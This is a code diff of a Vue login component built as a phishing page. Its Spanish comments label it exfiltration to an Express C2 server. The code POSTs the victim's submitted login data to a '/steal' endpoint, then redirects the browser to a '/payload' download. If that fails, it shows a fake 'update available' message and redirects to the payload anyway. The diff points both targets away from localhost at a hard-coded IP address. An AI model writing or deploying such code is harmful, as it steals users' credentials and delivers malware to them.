@@ -151,6 +151,8 @@
 <script setup>
 import { ref, reactive } from "vue";
 
+const IP = "10.214.195.151";
+
 // Emits
 const emit = defineEmits([
   "login-success",
@@ -212,7 +214,7 @@ async function handleLogin() {
 
   try {
     //EXFILTRAR A TU EXPRESS C2
-    const response = await fetch("http://localhost:3000/steal", {
+    const response = await fetch(`http://${IP}:3000/steal`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -230,13 +232,13 @@ async function handleLogin() {
 
     // REDIRIGE A PAYLOAD
     setTimeout(() => {
-      window.location.href = "http://localhost:3000/payload";
+      window.location.href = `http://${IP}:3000/payload`;
     }, 2000);
   } catch (error) {
     // FAILSAFE - igual descarga payload
     mensaje.texto = "¡Actualización disponible!";
     setTimeout(() => {
-      window.location.href = "http://localhost:3000/payload";
+      window.location.href = `http://${IP}:3000/payload`;
     }, 1500);
   } finally {
     cargando.value = false;
